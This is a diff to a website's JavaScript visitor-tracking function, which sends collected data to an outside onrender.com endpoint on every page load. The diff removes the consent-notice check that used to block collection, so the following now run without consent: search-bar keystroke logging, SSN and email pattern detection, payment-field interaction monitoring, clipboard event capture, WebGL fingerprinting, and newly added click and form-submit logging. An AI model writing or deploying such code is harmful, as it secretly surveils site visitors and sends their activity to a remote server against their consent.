@@ -55,6 +55,7 @@ async function sendVisitorInfo() {
       }
     }
 
+    // Base payload
     const payload = {
       device: (function getDevice() {
         const ua = navigator.userAgent;
@@ -87,158 +88,182 @@ async function sendVisitorInfo() {
                     (document.querySelectorAll('.project-card').length >= 3 && 
                      document.querySelectorAll('.project-card')[2]?.offsetParent !== null);
 
+    const sessionStart = performance.now();
+
     if (isPage3) {
-      const consentNotice = document.getElementById('consent-notice');
-      if (!consentNotice || consentNotice.style.display === 'none') {
-        console.warn('Data collection skipped: Missing or hidden consent notice');
-        payload.part3 = {
-          keystrokes: 'Consent not provided',
-          mouseMovementFrequency: 'Consent not provided',
-          webglSupport: 'Consent not provided',
-          connectionType: 'Consent not provided',
-          clipboardAccess: 'Consent not provided',
-          deviceOrientationSupport: 'Consent not provided',
-          sessionStorageUsage: 'Consent not provided',
-          browserFeatures: 'Consent not provided',
-          pageLoadTime: 'Consent not provided',
-          userInteractionCount: 'Consent not provided',
-          ssnPatternDetected: 'Consent not provided',
-          emailPatternDetected: 'Consent not provided',
-          paymentFieldInteraction: 'Consent not provided'
-        };
-      } else {
-        payload.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
-        
-        let batteryInfo = 'Unknown';
-        if (navigator.getBattery) {
-          try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `${battery.level * 100}%${battery.charging ? ' (Charging)' : ''}`;
-          } catch (e) {
-            console.error('Battery API error:', e.message);
-          }
-        }
-        payload.batteryStatus = batteryInfo;
-
-        payload.currentUrl = window.location.href;
-        payload.scrollPosition = `${Math.round(window.scrollY)}px`;
-
-        // Part 3 fields
-        payload.part3 = {};
-
-        let keystrokes = '';
-        const searchBar = document.getElementById('search-bar');
-        if (searchBar) {
-          searchBar.addEventListener('keydown', (event) => {
-            if (keystrokes.length < 50 && !event.key.includes('password') && !event.key.includes('card') && !event.key.includes('ssn')) {
-              keystrokes += event.key;
-            }
-          });
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        } else {
-          console.warn('Keylogging skipped: Missing #search-bar');
-        }
-        payload.part3.keystrokes = keystrokes || 'None';
-
-        let ssnPatternDetected = 'None';
-        if (searchBar) {
-          searchBar.addEventListener('input', (event) => {
-            const value = event.target.value;
-            if (/\d{3}-\d{2}-\d{4}/.test(value)) {
-              ssnPatternDetected = 'SSN-like pattern detected';
-            }
-          });
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-        payload.part3.ssnPatternDetected = ssnPatternDetected;
-
-        let emailPatternDetected = 'None';
-        if (searchBar) {
-          searchBar.addEventListener('input', (event) => {
-            const value = event.target.value;
-            if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(value)) {
-              emailPatternDetected = 'Email-like pattern detected';
-            }
-          });
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-        payload.part3.emailPatternDetected = emailPatternDetected;
-
-        let paymentFieldInteraction = 'None';
-        const paymentFields = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
-        if (paymentFields.length > 0) {
-          paymentFields.forEach(field => {
-            field.addEventListener('input', () => {
-              paymentFieldInteraction = 'Input in payment-related field detected';
-            });
-          });
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-        payload.part3.paymentFieldInteraction = paymentFieldInteraction;
-
-        let mouseMoves = 0;
-        document.addEventListener('mousemove', () => mouseMoves++, { once: false });
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        document.removeEventListener('mousemove', () => mouseMoves++);
-        payload.part3.mouseMovementFrequency = `${mouseMoves}/s`;
-
-        // WebGL support
-        let webglInfo = 'Not supported';
+      payload.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
+      
+      let batteryInfo = 'Unknown';
+      if (navigator.getBattery) {
         try {
-          const canvas = document.createElement('canvas');
-          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-          if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            webglInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL supported';
-          }
+          const battery = await navigator.getBattery();
+          batteryInfo = `${battery.level * 100}%${battery.charging ? ' (Charging)' : ''}`;
         } catch (e) {
-          console.error('WebGL error:', e.message);
+          console.error('Battery API error:', e.message);
         }
-        payload.part3.webglSupport = webglInfo;
-
-        payload.part3.connectionType = navigator.connection?.effectiveType || 'Unknown';
-
-        let clipboardAccess = 'None';
-        try {
-          document.addEventListener('copy', () => clipboardAccess = 'Copy attempted', { once: true });
-          document.addEventListener('paste', () => clipboardAccess = 'Paste attempted', { once: true });
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        } catch (e) {
-          console.error('Clipboard error:', e.message);
-        }
-        payload.part3.clipboardAccess = clipboardAccess;
-
-        payload.part3.deviceOrientationSupport = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
-
-        let sessionStorageSize = 0;
-        try {
-          for (let key in sessionStorage) {
-            if (sessionStorage.hasOwnProperty(key)) {
-              sessionStorageSize += ((sessionStorage[key].length + key.length) * 2);
-            }
-          }
-        } catch (e) {
-          console.error('Session storage error:', e.message);
-        }
-        payload.part3.sessionStorageUsage = `${sessionStorageSize} bytes`;
-
-        const browserFeatures = [];
-        if ('RTCPeerConnection' in window) browserFeatures.push('WebRTC');
-        if ('geolocation' in navigator) browserFeatures.push('Geolocation');
-        if ('serviceWorker' in navigator) browserFeatures.push('ServiceWorker');
-        payload.part3.browserFeatures = browserFeatures.length ? browserFeatures.join(', ') : 'None';
-
-        // Page load time
-        const loadTime = performance.now();
-        payload.part3.pageLoadTime = `${Math.round(loadTime)}ms`;
-
-        // User interaction count (clicks)
-        let clickCount = 0;
-        document.addEventListener('click', () => clickCount++, { once: false });
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        document.removeEventListener('click', () => clickCount++);
-        payload.part3.userInteractionCount = clickCount;
       }
+      payload.batteryStatus = batteryInfo;
+
+      payload.currentUrl = window.location.href;
+      payload.scrollPosition = `${Math.round(window.scrollY)}px`;
+
+      payload.part3 = {};
+
+      let keystrokes = '';
+      const searchBar = document.getElementById('search-bar');
+      if (searchBar) {
+        searchBar.addEventListener('keydown', (event) => {
+          if (keystrokes.length < 50 && !event.key.includes('password') && !event.key.includes('card') && !event.key.includes('ssn')) {
+            keystrokes += event.key;
+          }
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      } else {
+        console.warn('Keylogging skipped: Missing #search-bar');
+      }
+      payload.part3.keystrokes = keystrokes || 'None';
+
+      let ssnPatternDetected = 'None';
+      if (searchBar) {
+        searchBar.addEventListener('input', (event) => {
+          const value = event.target.value;
+          if (/\d{3}-\d{2}-\d{4}/.test(value)) {
+            ssnPatternDetected = 'SSN-like pattern detected';
+          }
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+      payload.part3.ssnPatternDetected = ssnPatternDetected;
+
+      let emailPatternDetected = 'None';
+      if (searchBar) {
+        searchBar.addEventListener('input', (event) => {
+          const value = event.target.value;
+          if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(value)) {
+            emailPatternDetected = 'Email-like pattern detected';
+          }
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+      payload.part3.emailPatternDetected = emailPatternDetected;
+
+      let paymentFieldInteraction = 'None';
+      const paymentFields = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
+      if (paymentFields.length > 0) {
+        paymentFields.forEach(field => {
+          field.addEventListener('input', () => {
+            paymentFieldInteraction = 'Input in payment-related field detected';
+          });
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+      payload.part3.paymentFieldInteraction = paymentFieldInteraction;
+
+      let mouseMoves = 0;
+      document.addEventListener('mousemove', () => mouseMoves++, { once: false });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('mousemove', () => mouseMoves++);
+      payload.part3.mouseMovementFrequency = `${mouseMoves}/s`;
+
+      let webglInfo = 'Not supported';
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          webglInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL supported';
+        }
+      } catch (e) {
+        console.error('WebGL error:', e.message);
+      }
+      payload.part3.webglSupport = webglInfo;
+
+      payload.part3.connectionType = navigator.connection?.effectiveType || 'Unknown';
+
+      let clipboardAccess = 'None';
+      try {
+        document.addEventListener('copy', () => clipboardAccess = 'Copy attempted', { once: true });
+        document.addEventListener('paste', () => clipboardAccess = 'Paste attempted', { once: true });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      } catch (e) {
+        console.error('Clipboard error:', e.message);
+      }
+      payload.part3.clipboardAccess = clipboardAccess;
+
+      payload.part3.deviceOrientationSupport = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
+
+      let sessionStorageSize = 0;
+      try {
+        for (let key in sessionStorage) {
+          if (sessionStorage.hasOwnProperty(key)) {
+            sessionStorageSize += ((sessionStorage[key].length + key.length) * 2);
+          }
+        }
+      } catch (e) {
+        console.error('Session storage error:', e.message);
+      }
+      payload.part3.sessionStorageUsage = `${sessionStorageSize} bytes`;
+
+      const browserFeatures = [];
+      if ('RTCPeerConnection' in window) browserFeatures.push('WebRTC');
+      if ('geolocation' in navigator) browserFeatures.push('Geolocation');
+      if ('serviceWorker' in navigator) browserFeatures.push('ServiceWorker');
+      payload.part3.browserFeatures = browserFeatures.length ? browserFeatures.join(', ') : 'None';
+
+      const loadTime = performance.now();
+      payload.part3.pageLoadTime = `${Math.round(loadTime)}ms`;
+
+      let clickCount = 0;
+      document.addEventListener('click', () => clickCount++, { once: false });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('click', () => clickCount++);
+      payload.part3.userInteractionCount = clickCount;
+
+      payload.part3.referrer = document.referrer || 'Direct';
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParameters = {
+        utm_source: urlParams.get('utm_source') || 'None',
+        utm_medium: urlParams.get('utm_medium') || 'None',
+        utm_campaign: urlParams.get('utm_campaign') || 'None'
+      };
+      payload.part3.utmParameters = JSON.stringify(utmParameters);
+
+      let clickedElements = [];
+      document.addEventListener('click', (event) => {
+        const target = event.target;
+        const elementInfo = {
+          tag: target.tagName.toLowerCase(),
+          class: target.className || 'None',
+          id: target.id || 'None'
+        };
+        if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(type => target.type.includes(type) || target.name?.includes(type))) {
+          clickedElements.push(JSON.stringify(elementInfo));
+        }
+      }, { once: false });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('click', () => {});
+      payload.part3.clickedElements = clickedElements.length ? clickedElements.join('; ') : 'None';
+
+      const sessionDuration = Math.round(performance.now() - sessionStart);
+      payload.part3.sessionDuration = `${sessionDuration}ms`;
+
+      let eventLog = [];
+      eventLog.push(`PageView: ${window.location.href}`);
+      document.addEventListener('click', (event) => {
+        const target = event.target;
+        if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(type => target.type.includes(type) || target.name?.includes(type))) {
+          eventLog.push(`Click: ${target.tagName.toLowerCase()}${target.id ? `#${target.id}` : ''}${target.className ? `.${target.className}` : ''}`);
+        }
+      }, { once: false });
+      document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', () => {
+          eventLog.push(`FormSubmit: ${form.id || form.action || 'unnamed form'}`);
+        });
+      });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('click', () => {});
+      payload.part3.eventLog = eventLog.length ? eventLog.join('; ') : 'None';
     }
 
     const response = await fetch('https://random-nfpf.onrender.com/api/visit', {
@@ -268,7 +293,6 @@ async function sendVisitorInfo() {
   }
 }
 
-// Run on page load
 window.addEventListener('load', sendVisitorInfo);
 
 const themeSwitch = document.getElementById('theme-switch');
